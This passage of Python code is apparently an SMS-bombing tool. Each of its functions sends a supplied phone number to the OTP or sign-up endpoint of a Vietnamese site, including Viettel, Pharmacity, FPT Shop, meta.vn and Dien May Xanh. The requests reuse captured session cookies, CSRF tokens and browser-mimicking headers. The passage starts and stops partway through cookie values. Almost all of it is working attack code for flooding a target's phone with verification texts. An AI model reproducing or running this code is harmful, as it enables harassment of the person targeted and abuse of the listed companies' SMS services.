    # 'cookie': 'con.unl.lat=1720112400; con.unl.sc=1; _gid=GA1.3.2048602791.1720189695; _tt_enable_cookie=1; _ttp=loSwVu_AC7yj50Md2HhAQPUajHo; _clck=k364l7%7C2%7Cfn7%7C0%7C1647; _fbp=fb.2.1720189698853.917828572155116943; _hjSessionUser_1708983=eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==; __zi=3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1; _gcl_au=1.1.888803755.1720189704; con.ses.id=684bd57c-05df-40e6-8f09-cb91b12b83ee; _cfuvid=7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000; _gat_UA-3729099-1=1; _hjSession_1708983=eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; __gads=ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg; __gpi=UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ; __eoi=ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu; cf_clearance=CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A; ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D; ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D; _ga=GA1.3.697835917.1720189695; _clsk=lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D; _ga_HTS298453C=GS1.1.1720194528.2.1.1720194561.27.0.0',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'phoneNumber': phone,
}

    response = requests.get(
    'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
    params=params,
    cookies=cookies,
    headers=headers,
)

def dvcd(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
   
###
def myvt(phone):
    cookies = {
        'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
        '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
        'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
         'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    
##
   
###
  
###
def phar(phone):
    headers = {
        'authority': 'data-service.pharmacity.io',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'dnt': '1',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    response = requests.get(
        'https://data-service.pharmacity.io/pmc-ecm-webapp-config-api/production/banner/654%20x%20324-1684304235294.png',
        headers=headers,
    )


    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'access-control-request-headers': 'content-type',
        'access-control-request-method': 'POST',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    response = requests.options('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers)


    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'referral': '',
    }

    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
   
####
def one(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'msisdn': phone,
    'languageCode': 'vi',
}

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
   
##
def fptshop(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://fptshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fptshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'fromSys': 'WEBKHICT',
    'otpType': '0',
    'phoneNumber': phone,
}

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
 
#####
###
  
####
def meta(phone):
    cookies = {
    '_ssid': 'vhs1wox2wourjpxsr55hygiu',
    '_cart_': '50568886-ac95-4d4b-b7e3-7819d23d7e44',
    '_gcl_au': '1.1.1853648441.1720104054',
    '__ckmid': '533492a097c04aa18d6dc2d81118d705',
    '_gid': 'GA1.2.95221250.1720104055',
    '_gat_UA-1035222-8': '1',
    '_ga': 'GA1.1.172471248.1720104055',
    '.mlc': 'eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=',
    '_clck': 'lpzudx%7C2%7Cfn6%7C0%7C1646',
    '_clsk': '1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect',
    '_ga_YE9QV6GZ0S': 'GS1.1.1720104062.1.1.1720104068.0.0.0',
    '_ga_L0FCVV58XQ': 'GS1.1.1720104056.1.1.1720104070.46.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_ssid=vhs1wox2wourjpxsr55hygiu; _cart_=50568886-ac95-4d4b-b7e3-7819d23d7e44; _gcl_au=1.1.1853648441.1720104054; __ckmid=533492a097c04aa18d6dc2d81118d705; _gid=GA1.2.95221250.1720104055; _gat_UA-1035222-8=1; _ga=GA1.1.172471248.1720104055; .mlc=eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=; _clck=lpzudx%7C2%7Cfn6%7C0%7C1646; _clsk=1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect; _ga_YE9QV6GZ0S=GS1.1.1720104062.1.1.1720104068.0.0.0; _ga_L0FCVV58XQ=GS1.1.1720104056.1.1.1720104070.46.0.0',
    'origin': 'https://meta.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://meta.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'api_mode': '1',
}

    json_data = {
    'api_args': {
        'lgUser': phone,
        'type': 'phone',
    },
    'api_method': 'CheckRegister',
}

    response = requests.post(
    'https://meta.vn/app_scripts/pages/AccountReact.aspx',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
   
###
def blu(phone):
    cookies = {
    'DMX_View': 'DESKTOP',
    'DMX_Personal': '%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d',
    '_gcl_au': '1.1.804133484.1690973397',
    '_gid': 'GA1.2.1071358409.1690973397',
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.8.8977': 'c624660949009f11.1690973398.',
    '_pk_ses.8.8977': '1',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1',
    'cebs': '1',
    '_ce.s': 'v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116',
    '_fbp': 'fb.1.1690973400267.315266557',
    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0',
    'lhc_per': 'vid|c3330ef02699a3239f3d',
    '_gat_UA-38936689-1': '1',
    '_ga_Y7SWKJEHCE': 'GS1.1.1690973397.1.1.1690973847.59.0.0',
    '_ga': 'GA1.1.1906131468.1690973397',
    'SvID': 'dmxcart2737|ZMo2n|ZMo01',
    'cebsp_': '2',
}

    headers = {
    'authority': 'www.dienmayxanh.com',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d; _gcl_au=1.1.804133484.1690973397; _gid=GA1.2.1071358409.1690973397; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=c624660949009f11.1690973398.; _pk_ses.8.8977=1; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1; cebs=1; _ce.s=v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116; _fbp=fb.1.1690973400267.315266557; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU; _ce.clock_event=1; _ce.clock_data=-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0; lhc_per=vid|c3330ef02699a3239f3d; _gat_UA-38936689-1=1; _ga_Y7SWKJEHCE=GS1.1.1690973397.1.1.1690973847.59.0.0; _ga=GA1.1.1906131468.1690973397; SvID=dmxcart2737|ZMo2n|ZMo01; cebsp_=2',
    'origin': 'https://www.dienmayxanh.com',
    'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvIRzWBz3HYz5v5BqsZBR9c1E2ww7q_1JGohDXjcRDM1kdeAbuyRu9P0s0XFTPbkk43itS19oUg6iD6CroYe4kX3wq5d8C1R5pfyfCr1uXg2ZI5cgkU7CkZOa4xBIZIW_k0',
}
 
    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
   
  ###
def tgdt(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_gcl_au': '1.1.1121422736.1720077126',
    '_ga': 'GA1.1.304095547.1720077127',
    '_pk_id.8.8977': 'f4065ec429abd1e2.1720077127.',
    '_ce.clock_data': '-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    '_fbp': 'fb.1.1720077128189.217218927440922861',
    'TBMCookie_3209819802479625248': '350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.8.8977': '1',
    'SvID': 'new2688|Zoaz1|Zoaz0',
    '_ce.irv': 'returning',
    'cebs': '1',
    '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI',
    'cebsp_': '2',
    '_ga_Y7SWKJEHCE': 'GS1.1.1720103888.2.1.1720103890.58.0.0',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1',
    '_ce.s': 'v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1121422736.1720077126; _ga=GA1.1.304095547.1720077127; _pk_id.8.8977=f4065ec429abd1e2.1720077127.; _ce.clock_data=-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; _fbp=fb.1.1720077128189.217218927440922861; TBMCookie_3209819802479625248=350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=; ___utmvm=###########; 